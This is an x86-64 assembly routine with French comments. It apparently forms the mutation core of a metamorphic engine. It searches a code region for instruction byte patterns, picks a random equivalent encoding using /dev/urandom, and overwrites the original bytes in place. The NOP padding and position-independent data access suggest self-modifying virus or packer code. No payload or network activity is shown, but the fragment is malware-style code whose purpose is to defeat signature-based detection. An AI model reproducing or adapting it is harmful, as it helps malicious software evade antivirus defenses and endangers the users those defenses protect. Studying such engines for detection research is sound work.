
; RAX = START, RDI = END, RDX = FUNC ADDR, R8 = LEN, R9 = NUMBER
	PUSH_ALL
	mov		rcx, rdi
	sub		rcx, rax
	sub		rcx, r8

	.loop_start:

	PUSH_ALL
	mov		r15, rax
	mov		r14, rdx
	mov		rax, rcx
	mov		rcx, r9
	.finding_equalreplace:	; LOOP SUR LE NOMBRE DE R9 NUMBERS DONC MANIERES DE MODIFIER


	PUSH_ALLr
	xor		rax, rax
	NOP
	NOP
	NOP
	NOP
	mov		rsi, r15
	mov		rdi, rdx
	mov		r9, rcx
	dec		r9
	mov		rcx, r8

	.cmpbfind_eq:
		mov		r14b, byte [rsi]
		mov		r15b, byte [rdi]
		cmp		r14b, r15b
		jne		.quit_loopfind_eq

		.skipfind_eq:
		inc		rsi	;	Le  code
		inc		rdi	;	Les nombres
	loop	.cmpbfind_eq

	inc		rax
	.quit_loopfind_eq:
	POP_ALLr



	test	rax, rax
	jnz		.equlreplace
	add		rdx, r8
	loop	.finding_equalreplace
	jmp		.retreplace
	.equlreplace:

	mov		rcx, r8


	PUSH_ALLr
	xor		rax, rax
	NOP
	NOP
	NOP
	NOP
	mov		rdi, [rbp + 16]
	add		rdi, mydata.urandom_path
	;lea		rdi, [rel urandom_path]
	xor		rsi, rsi
	NOP
	NOP
	NOP
	NOP
	mov		rax, SYS_open
	syscall
	mov		r12, rax
	mov		rdi, r12
	mov		rsi, [rbp + 16]
	add		rsi, mydata.randbuf
	;lea		rsi, [rel randbuf]
	mov		rdx, 8
	mov		rax, SYS_read
	syscall
	mov		rdi, r12
	mov		rax, SYS_close
	syscall
	mov		rax, [rbp + 16]
	add		rax, mydata.randbuf
	mov		rax, [rax]
	xor		rdx, rdx
	NOP
	NOP
	NOP
	NOP
	mov		rcx, r9
	div		rcx
	mov		rax, rdx
	POP_ALLr
	; r15 le code
	; r14  les instructions

	imul	r8, rax
	add		r14, r8
	mov		rsi, r14
	mov		rdi, r15

	rep		movsb

	.retreplace:
	POP_ALL
	inc		rax
	dec		rcx
	test	rcx, rcx
	jne		.loop_start
	POP_ALL
